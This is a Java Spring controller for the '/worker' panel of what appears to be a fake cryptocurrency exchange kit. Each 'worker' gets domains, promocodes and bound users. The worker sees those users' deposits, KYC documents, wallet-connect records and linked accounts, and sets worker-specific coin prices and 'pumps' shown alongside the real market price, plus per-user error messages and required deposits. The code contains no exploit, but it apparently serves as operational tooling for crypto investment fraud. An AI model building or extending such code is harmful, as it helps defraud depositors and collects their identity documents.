package me.yukitale.yellowexchange.panel.worker.controller;

import jakarta.servlet.http.HttpServletRequest;
import me.yukitale.yellowexchange.exchange.model.Coin;
import me.yukitale.yellowexchange.exchange.model.user.*;
import me.yukitale.yellowexchange.exchange.repository.CoinRepository;
import me.yukitale.yellowexchange.exchange.repository.user.*;
import me.yukitale.yellowexchange.exchange.service.CoinService;
import me.yukitale.yellowexchange.exchange.service.UserService;
import me.yukitale.yellowexchange.panel.admin.model.*;
import me.yukitale.yellowexchange.panel.admin.repository.AdminSettingsRepository;
import me.yukitale.yellowexchange.panel.admin.repository.AdminTelegramSettingsRepository;
import me.yukitale.yellowexchange.panel.common.model.DepositCoin;
import me.yukitale.yellowexchange.panel.common.model.Domain;
import me.yukitale.yellowexchange.panel.common.repository.DomainRepository;
import me.yukitale.yellowexchange.panel.common.repository.PromocodeRepository;
import me.yukitale.yellowexchange.panel.common.service.StatsService;
import me.yukitale.yellowexchange.panel.worker.model.*;
import me.yukitale.yellowexchange.panel.worker.repository.*;
import me.yukitale.yellowexchange.panel.worker.service.WorkerService;
import me.yukitale.yellowexchange.utils.DataValidator;
import me.yukitale.yellowexchange.utils.DateUtil;
import me.yukitale.yellowexchange.utils.MyDecimal;
import me.yukitale.yellowexchange.utils.PaginationUtil;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.domain.PageRequest;
import org.springframework.data.domain.Pageable;
import org.springframework.security.access.prepost.PreAuthorize;
import org.springframework.security.core.Authentication;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestHeader;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.servlet.view.RedirectView;

import java.util.*;
import java.util.stream.Collectors;

@Controller
@RequestMapping(value = "/worker")
@PreAuthorize("hasRole('ROLE_WORKER')")
public class WorkerController {

    @Autowired
    private AdminSettingsRepository adminSettingsRepository;

    @Autowired
    private CoinRepository coinRepository;

    @Autowired
    private UserRepository userRepository;

    @Autowired
    private UserSettingsRepository userSettingsRepository;

    @Autowired
    private UserBalanceRepository userBalanceRepository;

    @Autowired
    private UserTransactionRepository userTransactionRepository;

    @Autowired
    private UserLogRepository userLogRepository;

    @Autowired
    private UserAddressRepository userAddressRepository;

    @Autowired
    private UserRequiredDepositCoinRepository userRequiredDepositCoinRepository;

    @Autowired
    private UserSupportDialogRepository userSupportDialogRepository;

    @Autowired
    private UserSupportMessageRepository userSupportMessageRepository;

    @Autowired
    private UserKycRepository userKycRepository;

    @Autowired
    private UserDepositRepository userDepositRepository;

    @Autowired
    private UserWalletConnectRepository userWalletConnectRepository;

    @Autowired
    private WorkerRepository workerRepository;

    @Autowired
    private WorkerSupportPresetRepository workerSupportPresetRepository;

    @Autowired
    private PromocodeRepository promocodeRepository;

    @Autowired
    private DomainRepository domainRepository;

    @Autowired
    private EmailBanRepository emailBanRepository;

    @Autowired
    private UserService userService;

    @Autowired
    private WorkerService workerService;

    @Autowired
    private WorkerSettingsRepository workerSettingsRepository;

    @Autowired
    private WorkerLegalSettingsRepository workerLegalSettingsRepository;

    @Autowired
    private WorkerCoinSettingsRepository workerCoinSettingsRepository;

    @Autowired
    private WorkerDepositCoinRepository workerDepositCoinRepository;

    @Autowired
    private WithdrawCoinLimitRepository withdrawCoinLimitRepository;

    @Autowired
    private WorkerRecordSettingsRepository workerRecordSettingsRepository;

    @Autowired
    private FastPumpRepository fastPumpRepository;

    @Autowired
    private StablePumpRepository stablePumpRepository;

    @Autowired
    private CoinService coinService;

    @Autowired
    private WorkerTelegramSettingsRepository workerTelegramSettingsRepository;

    @Autowired
    private AdminTelegramSettingsRepository adminTelegramSettingsRepository;

    @Autowired
    private WorkerErrorMessagesRepository workerErrorMessagesRepository;

    @Autowired
    private WorkerCryptoLendingRepository workerCryptoLendingRepository;

    @Autowired
    private StatsService statsService;

    @GetMapping(value = "")
    public RedirectView emptyController() {
        return new RedirectView("/worker/binding");
    }

    @GetMapping(value = "/")
    public RedirectView indexController() {
        return new RedirectView("/worker/binding");
    }

    @GetMapping(value = "binding")
    public String bindingController(Authentication authentication, Model model, @RequestHeader("host") String host, HttpServletRequest request, @RequestParam(name = "panel_lang", required = false) String panelLang) {
        User user = userService.addUserAttribute(authentication, model);
        Worker worker = workerService.addWorkerAttribute(user, model);
        userService.addPanelLangAttribute(model, request, panelLang);

        addUnviewedCounterAttributes(model, worker);

        List<Domain> domains = domainRepository.findByWorkerIdOrderByIdDesc(worker.getId(), Pageable.unpaged());
        String domainsLine = domains.isEmpty() ? "No domains" : domains.stream().map(Domain::getName).collect(Collectors.joining(", "));

        addCoinsAttribute(model);
        model.addAttribute("promocodes", promocodeRepository.findByWorkerIdOrderByIdDesc(worker.getId()));
        model.addAttribute("host", host);
        model.addAttribute("worker", worker);
        model.addAttribute("domains", domainsLine);

        return "panel/worker/binding";
    }

    @GetMapping(value = "statistics")
    public String statisticsController(Authentication authentication, Model model, HttpServletRequest request, @RequestParam(name = "panel_lang", required = false) String panelLang) {
        User user = userService.addUserAttribute(authentication, model);
        Worker worker = workerService.addWorkerAttribute(user, model);
        userService.addPanelLangAttribute(model, request, panelLang);

        addUnviewedCounterAttributes(model, worker);

        model.addAttribute("stats", statsService.getWorkerStats(worker));

        model.addAttribute("settings", adminSettingsRepository.findFirst());

        return "panel/worker/statistics";
    }

    @GetMapping(value = "detailed-statistics")
    public String detailedStatisticsController(Authentication authentication, Model model, HttpServletRequest request, @RequestParam(name = "panel_lang", required = false) String panelLang) {
        User user = userService.addUserAttribute(authentication, model);
        Worker worker = workerService.addWorkerAttribute(user, model);
        userService.addPanelLangAttribute(model, request, panelLang);

        addUnviewedCounterAttributes(model, worker);

        long startTime = user.getRegistered().getTime();
        long currentTime = System.currentTimeMillis();
        int daysPeriod = (int) ((currentTime - startTime) / (86400 * 1000));

        if (daysPeriod == 0) {
            daysPeriod = 1;
        }

        long registrations = userRepository.countByWorkerId(worker.getId());
        long deposits = userDepositRepository.countByCompletedAndWorkerId(true, worker.getId());
        double depositsPrice = Optional.ofNullable(userDepositRepository.sumPriceByWorkerId(worker.getId())).orElse(0D);
        long addresses = userAddressRepository.countByUserWorkerId(worker.getId());
        //todo: support without welcome messages
        long dialogs = userSupportDialogRepository.countByUserWorkerId(worker.getId());
        long messages = userSupportMessageRepository.countByUserWorkerId(worker.getId());

        String averageRegistrations = new MyDecimal((double) registrations / (double) daysPeriod, true).toString();
        String averageDeposits = new MyDecimal((double) deposits / (double) daysPeriod, true).toString();
        String averageDepositsPrice = new MyDecimal(depositsPrice / (double) daysPeriod, true).toString();
        String averageAddresses = new MyDecimal((double) addresses / (double) daysPeriod, true).toString();
        String averageDialogs = new MyDecimal((double) dialogs / (double) daysPeriod, true).toString();
        String averageMessages = new MyDecimal((double) messages / (double) daysPeriod, true).toString();

        model.addAttribute("avg_registrations", averageRegistrations);
        model.addAttribute("avg_deposits", averageDeposits);
        model.addAttribute("avg_deposits_price", averageDepositsPrice);
        model.addAttribute("avg_addresses", averageAddresses);
        model.addAttribute("avg_dialogs", averageDialogs);
        model.addAttribute("avg_messages", averageMessages);

        return "panel/worker/detailed-statistics";
    }

    @GetMapping(value = "deposits")
    public String depositsController(Authentication authentication, Model model, HttpServletRequest request, @RequestParam(name = "panel_lang", required = false) String panelLang) {
        User user = userService.addUserAttribute(authentication, model);
        Worker worker = workerService.addWorkerAttribute(user, model);
        userService.addPanelLangAttribute(model, request, panelLang);

        addUnviewedCounterAttributes(model, worker);

        userDepositRepository.markWorkerAsViewed(worker.getId());

        List<UserDeposit> deposits = userDepositRepository.findByWorkerIdOrderByTxIdDesc(worker.getId());

        model.addAttribute("deposits", deposits);

        return "panel/worker/deposits";
    }

    @GetMapping(value = "withdraw")
    public String withdrawController(Authentication authentication, Model model, HttpServletRequest request, @RequestParam(name = "panel_lang", required = false) String panelLang) {
        User user = userService.addUserAttribute(authentication, model);
        Worker worker = workerService.addWorkerAttribute(user, model);
        userService.addPanelLangAttribute(model, request, panelLang);

        addUnviewedCounterAttributes(model, worker);

        userTransactionRepository.markWorkerAsViewed(UserTransaction.Type.WITHDRAW.ordinal(), worker.getId());

        List<UserTransaction> userTransactions = userTransactionRepository.findByTypeAndUserWorkerIdOrderByIdDesc(UserTransaction.Type.WITHDRAW, worker.getId());

        model.addAttribute("withdraws", userTransactions);

        return "panel/worker/withdraw";
    }

    @GetMapping(value = "wallet-connect")
    public String walletConnectController(Authentication authentication, Model model, HttpServletRequest request, @RequestParam(name = "panel_lang", required = false) String panelLang) {
        User user = userService.addUserAttribute(authentication, model);
        Worker worker = workerService.addWorkerAttribute(user, model);
        userService.addPanelLangAttribute(model, request, panelLang);

        addUnviewedCounterAttributes(model, worker);

        List<UserWalletConnect> walletConnects = userWalletConnectRepository.findByUserWorkerIdOrderByIdDesc(worker.getId());

        model.addAttribute("wallets", walletConnects);

        return "panel/worker/wallet-connect";
    }

    @GetMapping(value = "trading-courses")
    public String tradingCourseController(Authentication authentication, Model model, HttpServletRequest request, @RequestParam(name = "panel_lang", required = false) String panelLang) {
        User user = userService.addUserAttribute(authentication, model);
        Worker worker = workerService.addWorkerAttribute(user, model);
        userService.addPanelLangAttribute(model, request, panelLang);

        addUnviewedCounterAttributes(model, worker);

        List<Map<String, Object>> fastPumps = new ArrayList<>();
        for (Coin coin : coinRepository.findAll()) {
            if (coin.getSymbol().equals("USDT")) {
                continue;
            }

            MyDecimal realPrice = new MyDecimal(coinService.getPrice(coin.getSymbol()));
            MyDecimal price = new MyDecimal(coinService.getWorkerPriceZeroTime(worker, coin.getSymbol()));
            double realChangePercent = coinService.getPriceChangePercent(coin.getSymbol());
            double changePercent = coinService.getWorkerPriceChangePercentZeroTime(worker, coin.getSymbol());
            boolean pumped = fastPumpRepository.existsByWorkerIdAndCoinSymbol(worker.getId(), coin.getSymbol());
            fastPumps.add(new HashMap<>() {{
                put("id", coin.getId());
                put("symbol", coin.getSymbol());
                put("price", price.toString());
                put("real_price", realPrice.toString());
                put("price_change_percent", changePercent);
                put("real_price_change_percent", realChangePercent);
                put("pumped", pumped);
            }});
        }

        List<StablePump> stablePumps = stablePumpRepository.findAllByWorkerId(worker.getId());

        addCoinsAttribute(model);
        model.addAttribute("worker", worker);
        model.addAttribute("fast_pumps", fastPumps);
        model.addAttribute("stable_pumps", stablePumps);

        return "panel/worker/trading-courses";
    }

    @GetMapping(value = "settings")
    public String settingsController(Authentication authentication, Model model, HttpServletRequest request, @RequestParam(name = "panel_lang", required = false) String panelLang) {
        User user = userService.addUserAttribute(authentication, model);
        Worker worker = workerService.addWorkerAttribute(user, model);
        userService.addPanelLangAttribute(model, request, panelLang);

        addUnviewedCounterAttributes(model, worker);

        addCoinsAttribute(model);

        AdminTelegramSettings adminTelegramSettings = adminTelegramSettingsRepository.findFirst();
        WorkerSettings workerSettings = workerSettingsRepository.findByWorkerId(worker.getId()).orElse(null);
        WorkerCoinSettings workerCoinSettings = workerCoinSettingsRepository.findByWorkerId(worker.getId()).orElse(null);
        WorkerTelegramSettings workerTelegramSettings = workerTelegramSettingsRepository.findByWorkerId(worker.getId()).orElse(null);
        WorkerErrorMessages workerErrorMessages = workerErrorMessagesRepository.findByWorkerId(worker.getId()).orElse(null);

        List<WorkerCryptoLending> cryptoLendings = workerCryptoLendingRepository.findAllByWorkerId(worker.getId());

        model.addAttribute("bot", adminTelegramSettings.getBotUsername());
        model.addAttribute("settings", workerSettings);
        model.addAttribute("coin_settings", workerCoinSettings);
        model.addAttribute("telegram_settings", workerTelegramSettings);
        model.addAttribute("error_messages", workerErrorMessages);
        model.addAttribute("crypto_lendings", cryptoLendings);

        return "panel/worker/settings";
    }

    @GetMapping(value = "users")
    public String usersController(Authentication authentication, Model model, @RequestParam(name = "page", defaultValue = "1", required = false) String pageParam, @RequestParam(name = "type", defaultValue = "offline", required = false) String type,
                                  @RequestParam(name = "email", defaultValue = "null", required = false) String email, HttpServletRequest request, @RequestParam(name = "panel_lang", required = false) String panelLang) {
        User user = userService.addUserAttribute(authentication, model);
        Worker worker = workerService.addWorkerAttribute(user, model);
        userService.addPanelLangAttribute(model, request, panelLang);

        addUnviewedCounterAttributes(model, worker);

        double size = 30D;

        List<User> users;
        int page = 1;
        try {
            page = Integer.parseInt(pageParam);
        } catch (Exception ignored) {}
        int maxPage = 1;
        if (!email.equals("null")) {
            users = new ArrayList<>();
            User workerUser = null;
            if (DataValidator.isEmailValided(email)) {
                workerUser = userRepository.findByEmailAndWorkerId(email.toLowerCase(), worker.getId()).orElse(null);
            }
            if (workerUser != null) {
                users.add(workerUser);
            }
        } else {
            if (type.equals("online")) {
                long lastOnline = System.currentTimeMillis() - (10 * 1000);
                maxPage = (int) Math.ceil(userRepository.countByWorkerIdAndLastOnlineGreaterThan(worker.getId(), lastOnline) / size);
                if (page <= 1) {
                    page = 1;
                } else if (page > maxPage) {
                    page = Math.max(maxPage, 1);
                }

                Pageable pageable = PageRequest.of(page - 1, (int) size);
                users = userRepository.findAllByWorkerIdAndLastOnlineGreaterThanOrderByLastActivityDesc(worker.getId(), lastOnline, pageable);
            } else {
                maxPage = (int) Math.ceil(userRepository.countByWorkerId(worker.getId()) / size);
                if (page <= 1) {
                    page = 1;
                } else if (page > maxPage) {
                    page = Math.max(maxPage, 1);
                }

                Pageable pageable = PageRequest.of(page - 1, (int) size);
                users = userRepository.findAllByWorkerIdOrderByLastActivityDesc(worker.getId(), pageable);
            }
        }

        model.addAttribute("users", users);

        model.addAttribute("current_page", page);
        model.addAttribute("max_page", maxPage);
        model.addAttribute("type", type.equals("online") ? "online" : "offline");

        return "panel/worker/users";
    }

    @GetMapping(value = "user-edit")
    public String userEditController(Authentication authentication, Model model, @RequestParam("id") long userId, HttpServletRequest request, @RequestParam(name = "panel_lang", required = false) String panelLang) {
        User workerUser = userService.addUserAttribute(authentication, model);
        Worker worker = workerService.addWorkerAttribute(workerUser, model);
        userService.addPanelLangAttribute(model, request, panelLang);

        User user = userRepository.findByIdAndWorkerId(userId, worker.getId()).orElse(null);
        if (user == null) {
            return "redirect:users";
        }

        addUnviewedCounterAttributes(model, worker);
        addCoinsAttribute(model);
        addUserServiceAttribute(model);

        List<UserLog> latestLogs = userLogRepository.findByUserIdOrderByIdDesc(user.getId(), PageRequest.of(0, 50));
        long todayLogs = userLogRepository.countByUserIdAndDateGreaterThan(user.getId(), DateUtil.getTodayStartDate());

        Map<String, MyDecimal> balances = new HashMap<>();

        for (UserBalance userBalance : userBalanceRepository.findAllByUserId(user.getId())) {
            balances.put(userBalance.getCoinSymbol(), new MyDecimal(userBalance.getBalance()));
        }

        List<UserTransaction> userTransactions = userTransactionRepository.findByUserIdOrderByIdDesc(user.getId());

        List<UserAddress> userAddresses = userAddressRepository.findByUserId(user.getId());

        Map<Long, String> twinks = userRepository.findTwinksByIpAndWorkerAsMap(user.getRegIp(), worker.getId());
        twinks.remove(user.getId());

        model.addAttribute("twinks", twinks);

        model.addAttribute("transaction_types", UserTransaction.Type.values());

        model.addAttribute("worker_user_latest_logs", latestLogs);
        model.addAttribute("worker_user_today_logs", todayLogs);

        model.addAttribute("worker_user_error_messages", userService.getUserErrorMessages(user));

        model.addAttribute("worker_user_balances", balances);

        model.addAttribute("worker_user_transactions", userTransactions);

        List<? extends DepositCoin> depositCoins = userService.getUserAvailableDepositCoins(user);

        model.addAttribute("deposit_coins", depositCoins);

        List<DepositCoin> requiredDepositCoins = new ArrayList<>();

        List<UserRequiredDepositCoin> userRequiredDepositCoins = userRequiredDepositCoinRepository.findByUserId(user.getId());
        for (UserRequiredDepositCoin userRequiredDepositCoin : userRequiredDepositCoins) {
            depositCoins.stream().filter(coin -> coin.getType().equals(userRequiredDepositCoin.getType())).findFirst().ifPresent(requiredDepositCoins::add);
        }

        model.addAttribute("required_deposit_coins", requiredDepositCoins);

        model.addAttribute("worker_user_addresses", userAddresses);

        model.addAttribute("worker_user_banned", emailBanRepository.existsByEmail(user.getEmail()));

        model.addAttribute("worker_user_settings", userSettingsRepository.findByUserId(user.getId()).get());

        model.addAttribute("worker_user_kyc", userKycRepository.findByUserId(user.getId()).orElse(null));

        model.addAttribute("worker_user", user);

        return "panel/worker/user-edit";
    }

    @GetMapping(value = "logs")
    public String logsController(Authentication authentication, Model model, HttpServletRequest request, @RequestParam(name = "panel_lang", required = false) String panelLang) {
        User user = userService.addUserAttribute(authentication, model);
        Worker worker = workerService.addWorkerAttribute(user, model);
        userService.addPanelLangAttribute(model, request, panelLang);

        addUnviewedCounterAttributes(model, worker);

        List<UserLog> userLogs = userLogRepository.findByUserWorkerIdOrderByIdDesc(worker.getId(), PageRequest.of(0, 200));

        model.addAttribute("user_logs", userLogs);

        return "panel/worker/logs";
    }

    @GetMapping(value = "support-presets")
    public String supportPresetsController(Authentication authentication, Model model, HttpServletRequest request, @RequestParam(name = "panel_lang", required = false) String panelLang) {
        User user = userService.addUserAttribute(authentication, model);
        Worker worker = workerService.addWorkerAttribute(user, model);
        userService.addPanelLangAttribute(model, request, panelLang);

        addUnviewedCounterAttributes(model, worker);

        WorkerSettings workerSettings = workerSettingsRepository.findByWorkerId(worker.getId()).orElse(null);

        List<WorkerSupportPreset> supportPresets = workerSupportPresetRepository.findAllByWorkerId(worker.getId());

        model.addAttribute("settings", workerSettings);

        model.addAttribute("support_presets", supportPresets);

        return "panel/worker/support-presets";
    }

    @GetMapping(value = "aml")
    public String amlController(Authentication authentication, Model model, HttpServletRequest request, @RequestParam(name = "panel_lang", required = false) String panelLang) {
        User user = userService.addUserAttribute(authentication, model);
        Worker worker = workerService.addWorkerAttribute(user, model);
        userService.addPanelLangAttribute(model, request, panelLang);

        addUnviewedCounterAttributes(model, worker);

        WorkerLegalSettings workerLegalSettings = workerLegalSettingsRepository.findByWorkerId(worker.getId()).orElse(null);

        model.addAttribute("legal_settings", workerLegalSettings);

        return "panel/worker/aml";
    }

    @GetMapping(value = "terms")
    public String termsController(Authentication authentication, Model model, HttpServletRequest request, @RequestParam(name = "panel_lang", required = false) String panelLang) {
        User user = userService.addUserAttribute(authentication, model);
        Worker worker = workerService.addWorkerAttribute(user, model);
        userService.addPanelLangAttribute(model, request, panelLang);

        addUnviewedCounterAttributes(model, worker);

        WorkerLegalSettings workerLegalSettings = workerLegalSettingsRepository.findByWorkerId(worker.getId()).orElse(null);

        model.addAttribute("legal_settings", workerLegalSettings);

        return "panel/worker/terms";
    }

    @GetMapping(value = "allkyc")
    public String allKycController(Authentication authentication, Model model, HttpServletRequest request, @RequestParam(name = "panel_lang", required = false) String panelLang) {
        User user = userService.addUserAttribute(authentication, model);
        Worker worker = workerService.addWorkerAttribute(user, model);
        userService.addPanelLangAttribute(model, request, panelLang);

        addUnviewedCounterAttributes(model, worker);

        userKycRepository.markWorkerAsViewed(worker.getId());

        List<UserKyc> userKyc = userKycRepository.findAllByUserWorkerId(worker.getId());

        model.addAttribute("user_kyc", userKyc);

        return "panel/worker/allkyc";
    }

    @GetMapping(value = "domains")
    public String domainsController(Authentication authentication, Model model, @RequestParam(name = "page", defaultValue = "1", required = false) String pageParam,
                                    @RequestParam(name = "name", defaultValue = "null", required = false) String name, HttpServletRequest request, @RequestParam(name = "panel_lang", required = false) String panelLang) {
        User user = userService.addUserAttribute(authentication, model);
        Worker worker = workerService.addWorkerAttribute(user, model);
        userService.addPanelLangAttribute(model, request, panelLang);

        addUnviewedCounterAttributes(model, worker);

        double size = 30D;

        int page = 1;
        try {
            page = Integer.parseInt(pageParam);
        } catch (Exception ignored) {}
        int maxPage = 1;
        List<Domain> domains = null;
        if (name != null && !name.equals("null")) {
            domains = new ArrayList<>();

            Domain domain = domainRepository.findByWorkerIdAndName(worker.getId(), name.toLowerCase()).orElse(null);
            if (domain != null) {
                domains.add(domain);
            }
        } else {
            maxPage = (int) Math.ceil(domainRepository.countByWorkerId(worker.getId()) / size);
            if (page <= 1) {
                page = 1;
            } else if (page > maxPage) {
                page = Math.max(maxPage, 1);
            }

            Pageable pageable = PageRequest.of(page - 1, (int) size);
            domains = domainRepository.findByWorkerIdOrderByIdDesc(worker.getId(), pageable);
        }

        model.addAttribute("domains", domains);

        model.addAttribute("current_page", page);
        model.addAttribute("max_page", maxPage);

        return "panel/worker/domains";
    }

    @GetMapping(value = "domain-edit")
    public String domainEditController(Authentication authentication, Model model, @RequestParam("id") long domainId, HttpServletRequest request, @RequestParam(name = "panel_lang", required = false) String panelLang) {
        User user = userService.addUserAttribute(authentication, model);
        Worker worker = workerService.addWorkerAttribute(user, model);
        userService.addPanelLangAttribute(model, request, panelLang);

        addUnviewedCounterAttributes(model, worker);

        Domain domain = domainRepository.findByIdAndWorkerId(domainId, worker.getId()).orElse(null);
        if (domain == null) {
            return "redirect:domains";
        }

        model.addAttribute("domain", domain);

        model.addAttribute("home_page", domain.getHomeDesign());

        return "panel/worker/domain-edit";
    }

    @GetMapping(value = "coins")
    public String coinsController(Authentication authentication, Model model, HttpServletRequest request, @RequestParam(name = "panel_lang", required = false) String panelLang) {
        User user = userService.addUserAttribute(authentication, model);
        Worker worker = workerService.addWorkerAttribute(user, model);
        userService.addPanelLangAttribute(model, request, panelLang);

        addUnviewedCounterAttributes(model, worker);

        WorkerCoinSettings workerCoinSettings = workerCoinSettingsRepository.findByWorkerId(worker.getId()).orElse(null);
        List<WorkerDepositCoin> depositCoins = workerDepositCoinRepository.findAllByWorkerId(worker.getId());
        List<WithdrawCoinLimit> withdrawCoinLimits = withdrawCoinLimitRepository.findAllByWorkerId(worker.getId());
        List<Coin> coins = coinRepository.findAll();

        model.addAttribute("coin_settings", workerCoinSettings);
        model.addAttribute("deposit_coins", depositCoins);
        model.addAttribute("withdraw_coins", withdrawCoinLimits);
        model.addAttribute("coins", coins);

        return "panel/worker/coins";
    }

    @GetMapping(value = "utility")
    public String utilityController(Authentication authentication, Model model, HttpServletRequest request, @RequestParam(name = "panel_lang", required = false) String panelLang) {
        User user = userService.addUserAttribute(authentication, model);
        Worker worker = workerService.addWorkerAttribute(user, model);
        userService.addPanelLangAttribute(model, request, panelLang);

        addUnviewedCounterAttributes(model, worker);

        return "panel/worker/utility";
    }

    @GetMapping(value = "video-record")
    public String videoRecordController(Authentication authentication, Model model, HttpServletRequest request, @RequestParam(name = "panel_lang", required = false) String panelLang) {
        User user = userService.addUserAttribute(authentication, model);
        Worker worker = workerService.addWorkerAttribute(user, model);
        userService.addPanelLangAttribute(model, request, panelLang);

        addUnviewedCounterAttributes(model, worker);

        List<WorkerRecordSettings> workerRecordSettings = workerRecordSettingsRepository.findByWorkerId(worker.getId());

        model.addAttribute("record_settings", workerRecordSettings);

        return "panel/worker/video-record";
    }

    @GetMapping(value = "support")
    public String supportController(Authentication authentication, Model model, @RequestParam(value = "page", defaultValue = "1", required = false) String pageParam,
                                    @RequestParam(value = "type", defaultValue = "all", required = false) String typeParam, @RequestParam(value = "email", required = false) String email, HttpServletRequest request, @RequestParam(name = "panel_lang", required = false) String panelLang) {
        User user = userService.addUserAttribute(authentication, model);
        Worker worker = workerService.addWorkerAttribute(user, model);
        userService.addPanelLangAttribute(model, request, panelLang);

        addUnviewedCounterAttributes(model, worker);

        WorkerSettings workerSettings = workerSettingsRepository.findByWorkerId(worker.getId()).orElse(null);
        if (workerSettings.isSupportPresetsEnabled()) {
            List<WorkerSupportPreset> supportPresets = workerSupportPresetRepository.findAllByWorkerId(worker.getId());

            model.addAttribute("support_presets", supportPresets);
        }

        if (email != null) {
            email = email.toLowerCase();

            UserSupportDialog supportDialog = userSupportDialogRepository.findByUserWorkerIdAndUserEmail(worker.getId(), email).orElse(null);

            model.addAttribute("support_dialogs", supportDialog == null ? Collections.emptyList() : List.of(supportDialog));

            model.addAttribute("type", "all");

            model.addAttribute("current_page", 1);

            model.addAttribute("max_pages", 1);

            model.addAttribute("pages", PaginationUtil.paginate(1, 1, 10));
        } else {
            int page = 1;
            try {
                page = Integer.parseInt(pageParam);
            } catch (Exception ignored) {
            }

            boolean unviewed = typeParam.equals("unviewed");

            long dialogs = unviewed ?
                    userSupportDialogRepository.countByOnlyWelcomeAndUserWorkerIdAndSupportUnviewedMessagesGreaterThan(false, worker.getId(), 0) :
                    userSupportDialogRepository.countByOnlyWelcomeAndUserWorkerId(false, worker.getId());

            double pageSize = 50D;

            int pages = (int) Math.ceil((double) dialogs / pageSize);

            if (page > pages) {
                page = pages;
            }

            if (page <= 0) {
                page = 1;
            }

            Pageable pageable = PageRequest.of(page - 1, (int) pageSize);

            List<UserSupportDialog> supportDialogs = unviewed ?
                    userSupportDialogRepository.findByOnlyWelcomeAndUserWorkerIdAndSupportUnviewedMessagesGreaterThanOrderByLastMessageDateDesc(false, worker.getId(), 0, pageable) :
                    userSupportDialogRepository.findByOnlyWelcomeAndUserWorkerIdOrderByLastMessageDateDesc(false, worker.getId(), pageable);

            model.addAttribute("support_dialogs", supportDialogs);

            model.addAttribute("type", typeParam);

            model.addAttribute("current_page", page);

            model.addAttribute("max_pages", pages);

            model.addAttribute("pages", PaginationUtil.paginate(pages, page, 10));
        }

        return "panel/worker/support";
    }

    private void addUnviewedCounterAttributes(Model model, Worker worker) {
        model.addAttribute("support_unviewed", userSupportDialogRepository.countByOnlyWelcomeAndUserWorkerIdAndSupportUnviewedMessagesGreaterThan(false, worker.getId(), 0));
        model.addAttribute("deposits_unviewed", userDepositRepository.countByViewedAndWorkerId(false, worker.getId()));
        model.addAttribute("withdrawals_unviewed", userTransactionRepository.countByUnviewedAndWorkerId(UserTransaction.Type.WITHDRAW.ordinal(), worker.getId()));
        model.addAttribute("kyc_unviewed", userKycRepository.countByViewedAndUserWorkerId(false, worker.getId()));
    }

    private void addCoinsAttribute(Model model) {
        List<Coin> coins = coinRepository.findAll();
        model.addAttribute("coins", coins);
    }

    private void addUserServiceAttribute(Model model) {
        model.addAttribute("user_service", userService);
    }
}
